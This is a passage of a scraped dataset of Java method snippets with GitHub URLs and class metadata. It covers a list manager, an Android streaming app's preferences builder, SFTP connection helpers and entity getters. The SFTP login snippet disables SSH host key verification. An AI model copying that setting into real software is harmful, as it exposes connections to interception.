"https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "remove", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void remove(T remove) {        if (has(remove))            registry.remove(remove);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "remove", "params": ["Class"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void remove(Class remove) {        if (has(remove))            classRegistry.remove(remove);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "register", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void register(T... queue) {        for (T type : queue) {            include(type);        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "register", "params": ["Class"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void register(Class... queue) {        for (Class type : queue) {            include(type);        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "pull", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public T pull(Class<? extends T> clazz) {        return getRegistry().stream().filter(m -> m.getClass() == clazz).findFirst().orElse(null);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "clear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clear() {        if (!getRegistry().isEmpty())            getRegistry().clear();    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/manager/type/ListManager.java", "stars": "12", "class": {"name": "ListManager", "extends": null, "implements": ["IManager"], "modifiers": ["public", "abstract"]}}, {"method_name": "generate", "params": ["PreferencesHandler", "ButterUpdateManager", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<PrefItem>", "snippet": "        public static List<PrefItem> generate(final PreferencesHandler handler, ButterUpdateManager updateManager, boolean isTV) {            if(!(handler instanceof Context)) {                return new ArrayList<>();            }            return generate((Context) handler, handler, updateManager, isTV);        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/content/preferences/PreferencesHandler.java", "stars": "4", "class": {"name": "ItemsGenerator", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "generate", "params": ["Context", "PreferencesHandler", "ButterUpdateManager", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<PrefItem>", "snippet": "        public static List<PrefItem> generate(final Context context, final PreferencesHandler handler, final ButterUpdateManager updateManager, boolean isTV) {            List<PrefItem> prefItems = new ArrayList<>();            prefItems.add(PrefItem.newBuilder(context).setTitleResource(R.string.general).build());            final String[] items = { context.getString(R.string.title_movies), context.getString(R.string.title_shows), context.getString(R.string.title_anime) };            final String[] hwItems = { context.getString(R.string.hw_automatic), context.getString(R.string.disabled), context.getString(R.string.hw_decoding), context.getString(R.string.hw_full) };            final String[] qualities = context.getResources().getStringArray(R.array.video_qualities);            final String[] pixelFormats = { context.getString(R.string.rgb16), context.getString(R.string.rgb32), context.getString(R.string.yuv) };            if(!isTV)            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_default_view)                    .setTitleResource(R.string.default_view)                    .setPreferenceKey(Prefs.DEFAULT_PROVIDER)                    .setDefaultValue(ProviderManager.PROVIDER_TYPE_MOVIE)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), items, SelectionMode.SIMPLE_CHOICE, item.getValue(), 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(position);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return items[(Integer) item.getValue()];                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_default_view)                    .setTitleResource(R.string.grid_size)                    .setPreferenceKey(Prefs.GRID_SIZE)                    .setDefaultValue(\"2\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            String[] items = new String[] {\"1\", \"2\", \"3\", \"4\", \"5\"};                            handler.openListSelection(item.getTitle(), items, SelectionMode.SIMPLE_CHOICE, Arrays.asList(items).indexOf(item.getValue()), 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(items[position]);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return (String) item.getValue();                        }                    })                    .build());            if(!isTV)            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_default_player)                    .setTitleResource(R.string.default_player)                    .setPreferenceKey(Prefs.DEFAULT_PLAYER)                    .setDefaultValue(\"\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            int currentPosition = 0;                            String currentValue = item.getValue().toString();                            final Map<String, String> players = DefaultPlayer.getVideoPlayerApps();                            final String[] playerDatas = players.keySet().toArray(new String[players.size()]);                            String[] items = new String[players.size() + 1];                            items[0] = context.getString(R.string.internal_player);                            for (int i = 0; i < playerDatas.length; i++) {                                String playerData = playerDatas[i];                                String playerName = players.get(playerData);                                items[i + 1] = playerName;                                if (playerData.equals(currentValue)) {                                    currentPosition = i + 1;                                }                            }                            handler.openListSelection(item.getTitle(), items, SelectionMode.ADVANCED_CHOICE, currentPosition, 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    if (position == 0) {                                        DefaultPlayer.set(\"\", \"\");                                    } else {                                        String playerData = playerDatas[position - 1];                                        DefaultPlayer.set(players.get(playerData), playerData);                                    }                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return PrefUtils.get(context, Prefs.DEFAULT_PLAYER_NAME, context.getString(R.string.internal_player));                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_action_quality)                    .setTitleResource(R.string.quality)                    .setPreferenceKey(Prefs.QUALITY_DEFAULT)                    .hasNext(true)                    .setDefaultValue(\"720p\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), qualities, SelectionMode.SIMPLE_CHOICE, Arrays.asList(qualities).indexOf(item.getValue()), 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(qualities[position]);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return (String) item.getValue();                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_app_language)                    .setTitleResource(R.string.i18n_language)                    .setPreferenceKey(Prefs.LOCALE)                    .hasNext(true)                    .setDefaultValue(\"\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            int currentPosition = 0;                            String currentValue = item.getValue().toString();                            final String[] languages = context.getResources().getStringArray(R.array.translation_languages);                            Arrays.sort(languages);                            String[] items = new String[languages.length + 1];                            items[0] = context.getString(R.string.device_language);                            for (int i = 0; i < languages.length; i++) {                                Locale locale = LocaleUtils.toLocale(languages[i]);                                items[i + 1] = locale.getDisplayName(locale);                                if (languages[i].equals(currentValue)) {                                    currentPosition = i + 1;                                }                            }                            handler.openListSelection(item.getTitle(), items, SelectionMode.ADVANCED_CHOICE, currentPosition, 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    if (position == 0) {                                        item.clearValue();                                    } else {                                        item.saveValue(languages[position - 1]);                                    }                                    handler.showMessage(context.getString(R.string.restart_effect));                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            String langCode = item.getValue().toString();                            if (langCode.isEmpty())                                return context.getString(R.string.device_language);                            Locale locale = LocaleUtils.toLocale(langCode);                            return locale.getDisplayName(locale);                        }                    })                    .build());            if(!isTV)            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_wifi_only)                    .setTitleResource(R.string.stream_over_wifi_only)                    .setPreferenceKey(Prefs.WIFI_ONLY)                    .setDefaultValue(true)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            item.saveValue(!(boolean) item.getValue());                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            boolean enabled = (boolean) item.getValue();                            return enabled ? context.getString(R.string.enabled) : context.getString(R.string.disabled);                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context).setTitleResource(R.string.subtitles).build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_subtitle_color)                    .setTitleResource(R.string.subtitle_color)                    .setPreferenceKey(Prefs.SUBTITLE_COLOR)                    .hasNext(true)                    .setDefaultValue(Color.WHITE)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), null, SelectionMode.COLOR, item.getValue(), 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(value);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return String.format(\"#%06X\", 0xFFFFFF & (int) item.getValue());                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_subtitle_size)                    .setTitleResource(R.string.subtitle_size)                    .setPreferenceKey(Prefs.SUBTITLE_SIZE)                    .hasNext(true)                    .setDefaultValue(context.getResources().getInteger(R.integer.player_subtitles_default_text_size))                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), items, SelectionMode.NUMBER, item.getValue(), 10, 60, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(value);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return Integer.toString((int) item.getValue());                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_subtitle_stroke_color)                    .setTitleResource(R.string.subtitle_stroke_color)                    .setPreferenceKey(Prefs.SUBTITLE_STROKE_COLOR)                    .hasNext(true)                    .setDefaultValue(Color.BLACK)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), null, SelectionMode.COLOR, item.getValue(), 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(value);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return String.format(\"#%06X\", 0xFFFFFF & (int) item.getValue());                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_subtitle_stroke_width)                    .setTitleResource(R.string.subtitle_stroke_width)                    .setPreferenceKey(Prefs.SUBTITLE_STROKE_WIDTH)                    .hasNext(true)                    .setDefaultValue(2)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), items, SelectionMode.NUMBER, item.getValue(), 0, 5, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(value);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return Integer.toString((int) item.getValue());                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_subtitle_lang)                    .setTitleResource(R.string.default_subtitle_language)                    .setPreferenceKey(Prefs.SUBTITLE_DEFAULT)                    .hasNext(true)                    .setDefaultValue(\"\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            int currentPosition = 0;                            String currentValue = item.getValue().toString();                            final String[] languages = context.getResources().getStringArray(R.array.subtitle_languages);                            String[] items = new String[languages.length + 1];                            items[0] = context.getString(R.string.no_default_set);                            for (int i = 0; i < languages.length; i++) {                                Locale locale = LocaleUtils.toLocale(languages[i]);                                items[i + 1] = locale.getDisplayName(locale);                                if (languages[i].equals(currentValue)) {                                    currentPosition = i + 1;                                }                            }                            handler.openListSelection(item.getTitle(), items, SelectionMode.ADVANCED_CHOICE, currentPosition, 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    if (position == 0) {                                        item.clearValue();                                    } else {                                        item.saveValue(languages[position - 1]);                                    }                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            String langCode = item.getValue().toString();                            if (langCode.isEmpty())                                return context.getString(R.string.no_default_set);                            Locale locale = LocaleUtils.toLocale(langCode);                            return locale.getDisplayName(locale);                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context).setTitleResource(R.string.torrents).build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_connections)                    .setTitleResource(R.string.max_connections)                    .setPreferenceKey(Prefs.LIBTORRENT_CONNECTION_LIMIT)                    .hasNext(true)                    .setDefaultValue(200)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), items, SelectionMode.NUMBER, item.getValue(), 0, 200, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(value);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            int limit = (Integer) item.getValue();                            return limit + \" connections\";                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_download_limit)                    .setTitleResource(R.string.download_speed)                    .setPreferenceKey(Prefs.LIBTORRENT_DOWNLOAD_LIMIT)                    .hasNext(true)                    .setDefaultValue(0)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), items, SelectionMode.NUMBER, item.getValue(), 0, 3000, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(value);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            int limit = (Integer) item.getValue();                            if (limit == 0) {                                return context.getString(R.string.unlimited);                            } else {                                return (limit / 1000) + \" kB/s\";                            }                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_upload_limit)                    .setTitleResource(R.string.upload_speed)                    .setPreferenceKey(Prefs.LIBTORRENT_UPLOAD_LIMIT)                    .hasNext(true)                    .setDefaultValue(0)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), items, SelectionMode.NUMBER, item.getValue(), 0, 3000, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(value);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            int limit = (Integer) item.getValue();                            if (limit == 0) {                                return context.getString(R.string.unlimited);                            } else {                                return (limit / 1000) + \" kB/s\";                            }                        }                    })                    .build());            if(!isTV)            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_storage_location)                    .setTitleResource(R.string.storage_location)                    .setPreferenceKey(Prefs.STORAGE_LOCATION)                    .hasNext(true)                    .setDefaultValue(StorageUtils.getIdealCacheDirectory(context))                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), null, SelectionMode.DIRECTORY, item.getValue(), 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    if(value != null) {                                        item.saveValue(value);                                    } else {                                        item.clearValue();                                    }                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return item.getValue().toString();                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_remove_cache)                    .setTitleResource(R.string.remove_cache)                    .setPreferenceKey(Prefs.REMOVE_CACHE)                    .setDefaultValue(true)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            item.saveValue(!(boolean) item.getValue());                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            boolean enabled = (boolean) item.getValue();                            return enabled ? context.getString(R.string.enabled) : context.getString(R.string.disabled);                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context).setTitleResource(R.string.advanced).build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_hw_accel)                    .setTitleResource(R.string.hw_acceleration)                    .setPreferenceKey(Prefs.HW_ACCELERATION)                    .hasNext(true)                    .setDefaultValue(VLCOptions.HW_ACCELERATION_AUTOMATIC)                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.openListSelection(item.getTitle(), hwItems, SelectionMode.SIMPLE_CHOICE, ((Integer) item.getValue() + 1), 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    item.saveValue(position - 1);                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            switch ((int) item.getValue()) {                                case VLCOptions.HW_ACCELERATION_DECODING:                                    return context.getString(R.string.hw_decoding);                                case VLCOptions.HW_ACCELERATION_DISABLED:                                    return context.getString(R.string.disabled);                                case VLCOptions.HW_ACCELERATION_FULL:                                    return context.getString(R.string.hw_full);                                default:                                case VLCOptions.HW_ACCELERATION_AUTOMATIC:                                    return context.getString(R.string.hw_automatic);                            }                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_pixel_format)                    .setTitleResource(R.string.pixel_format)                    .setPreferenceKey(Prefs.PIXEL_FORMAT)                    .hasNext(true)                    .setDefaultValue(\"RV32\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            String currentValue = (String) item.getValue();                            int current = 1;                            if (currentValue.equals(\"YV12\")) {                                current = 2;                            } else if (currentValue.equals(\"RV16\")) {                                current = 0;                            }                            handler.openListSelection(item.getTitle(), pixelFormats, SelectionMode.SIMPLE_CHOICE, current, 0, 0, new OnSelectionListener() {                                @Override                                public void onSelection(int position, Object value) {                                    if(position == 2) {                                        item.saveValue(\"YV12\");                                    } else if (position == 0) {                                        item.saveValue(\"RV16\");                                    } else {                                        item.saveValue(\"RV32\");                                    }                                }                            });                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            if (item.getValue().equals(\"YV12\")) {                                return context.getString(R.string.yuv);                            } else if (item.getValue().equals(\"RV16\")) {                                return context.getString(R.string.rgb16);                            }                            return context.getString(R.string.rgb32);                        }                    })                    .build());            // prefItems.add(PrefItem.newBuilder(context)            //         .setIconResource(R.drawable.ic_nav_vpn)            //         .setTitleResource(R.string.show_vpn)            //         .setPreferenceKey(Prefs.SHOW_VPN)            //         .setDefaultValue(true)            //         .setOnClickListener(new PrefItem.OnClickListener() {            //             @Override            //             public void onClick(final PrefItem item) {            //                 item.saveValue(!(boolean) item.getValue());            //             }            //         })            //         .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {            //             @Override            //             public String get(PrefItem item) {            //                 boolean enabled = (boolean) item.getValue();            //                 return enabled ? context.getString(R.string.enabled) : context.getString(R.string.disabled);            //             }            //         })            //         .build());            prefItems.add(PrefItem.newBuilder(context).setTitleResource(R.string.updates).build());            // prefItems.add(PrefItem.newBuilder(context)            //         .setIconResource(R.drawable.ic_prefs_auto_update)            //         .setTitleResource(R.string.auto_updates)            //         .setPreferenceKey(Prefs.AUTOMATIC_UPDATES)            //         .setDefaultValue(true)            //         .setOnClickListener(new PrefItem.OnClickListener() {            //             @Override            //             public void onClick(final PrefItem item) {            //                 item.saveValue(!(boolean) item.getValue());            //             }            //         })            //         .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {            //             @Override            //             public String get(PrefItem item) {            //                 boolean enabled = (boolean) item.getValue();            //                 return enabled ? context.getString(R.string.enabled) : context.getString(R.string.disabled);            //             }            //         })            //         .build());            //            // prefItems.add(PrefItem.newBuilder(context)            //         .setIconResource(R.drawable.ic_prefs_check_update)            //         .setTitleResource(R.string.check_for_updates)            //         .setPreferenceKey(ButterUpdateManager.LAST_UPDATE_CHECK)            //         .setDefaultValue(1)            //         .setOnClickListener(new PrefItem.OnClickListener() {            //             @Override            //             public void onClick(final PrefItem item) {            //                 updateManager.checkUpdatesManually();            //             }            //         })            //         .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {            //             @Override            //             public String get(PrefItem item) {            //                 long timeStamp = Long.parseLong(PrefUtils.get(context, ButterUpdateManager.LAST_UPDATE_CHECK, \"0\"));            //                 Calendar cal = Calendar.getInstance(Locale.getDefault());            //                 cal.setTimeInMillis(timeStamp);            //                 String time = SimpleDateFormat.getTimeInstance(SimpleDateFormat.MEDIUM, Locale.getDefault()).format(timeStamp);            //                 String date = DateFormat.format(\"dd-MM-yyy\", cal).toString();            //                 return context.getString(R.string.last_check) + \": \" + date + \" \" + time;            //             }            //         })            //         .build());            prefItems.add(PrefItem.newBuilder(context).setTitleResource(R.string.about_app).build());            if (!BuildConfig.DEBUG && !isTV) {                prefItems.add(PrefItem.newBuilder(context)                        .setIconResource(R.drawable.ic_prefs_report_bug)                        .setTitleResource(R.string.report_a_bug)                        .setPreferenceKey(\"\")                        .setDefaultValue(\"\")                        .setOnClickListener(new PrefItem.OnClickListener() {                            @Override                            public void onClick(final PrefItem item) {                                Intent i = new Intent(Intent.ACTION_VIEW);                                i.setData(Uri.parse(\"https://github.com/popcorn-official/popcorn-android/issues/new\"));                                context.startActivity(i);                            }                        })                        .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                            @Override                            public String get(PrefItem item) {                                return context.getString(R.string.tap_to_open);                            }                        })                        .build());            }            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_changelog)                    .setTitleResource(R.string.changelog)                    .setPreferenceKey(\"\")                    .setDefaultValue(\"\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            ChangeLogDialogFragment changeLogDialogFragment = new ChangeLogDialogFragment();                            changeLogDialogFragment.show(((FragmentActivity) context).getSupportFragmentManager(), \"prefs_fragment\");                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return context.getString(R.string.tap_to_open);                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_open_source)                    .setTitleResource(R.string.open_source_licenses)                    .setPreferenceKey(\"\")                    .setDefaultValue(\"\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            Intent i = new Intent(Intent.ACTION_VIEW);                            i.setData(Uri.parse(Constants.GIT_URL + \"/blob/master/NOTICE.md\"));                            context.startActivity(i);                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return context.getString(R.string.tap_to_open);                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_version)                    .setTitleResource(R.string.version)                    .setPreferenceKey(\"\")                    .setDefaultValue(\"\")                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            try {                                PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);                                return packageInfo.versionName + \" - \" + VersionUtils.getBuildAbi();                            } catch (PackageManager.NameNotFoundException e) {                                e.printStackTrace();                            }                            return \"?.? (?) - ?\";                        }                    })                    .build());            prefItems.add(PrefItem.newBuilder(context)                    .setIconResource(R.drawable.ic_prefs_about)                    .setTitleResource(R.string.about_app)                    .setPreferenceKey(\"\")                    .setDefaultValue(\"\")                    .setOnClickListener(new PrefItem.OnClickListener() {                        @Override                        public void onClick(final PrefItem item) {                            handler.showMessage(ABOUT);                        }                    })                    .setSubtitleGenerator(new PrefItem.SubtitleGenerator() {                        @Override                        public String get(PrefItem item) {                            return context.getString(R.string.tap_to_open);                        }                    })                    .build());            return prefItems;        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/content/preferences/PreferencesHandler.java", "stars": "4", "class": {"name": "ItemsGenerator", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "login", "params": ["String", "int", "String", "String", "String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "SftpConnection", "snippet": "    public static SftpConnection login(String host, int port, String username, String prvKeyPath,                                       String password, int timeout){        JSch jSch = new JSch();        Session session = null;        ChannelSftp channelSftp = null;        try{            if(StringUtils.isNotBlank(prvKeyPath)){                jSch.addIdentity(prvKeyPath);            }            session = jSch.getSession(username, host,port);            if(null == session){                throw new RuntimeException(\"Login sftp server failed\");            }            session.setPassword(password);            Properties config = new Properties();            config.put(STRICT_HOST_KEY, \"no\");            config.put(\"PreferredAuthentications\", \"publickey,password\");            session.setConfig(config);            session.setTimeout(timeout);            session.connect();            channelSftp = (ChannelSftp)session.openChannel(\"sftp\");            channelSftp.connect();            return new SftpConnection(channelSftp, session);        }catch(Exception e){            if(null != session && session.isConnected()){                session.disconnect();            }            if(null != channelSftp && channelSftp.isConnected()){                channelSftp.disconnect();            }            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/conns/Sftp.java", "stars": "23", "class": {"name": "Sftp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "disconnect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void disconnect(){            if(channelSftp.isConnected()){                channelSftp.disconnect();            }            if(session.isConnected()){                session.disconnect();            }        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/conns/Sftp.java", "stars": "23", "class": {"name": "SftpConnection", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ChannelSftp", "snippet": "        public ChannelSftp getChannel(){            return channelSftp;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/conns/Sftp.java", "stars": "23", "class": {"name": "SftpConnection", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Session", "snippet": "        public Session getSession(){            return session;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/conns/Sftp.java", "stars": "23", "class": {"name": "SftpConnection", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getMid", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getMid() {        return mid;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setMid", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMid(Integer mid) {        this.mid = mid;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", 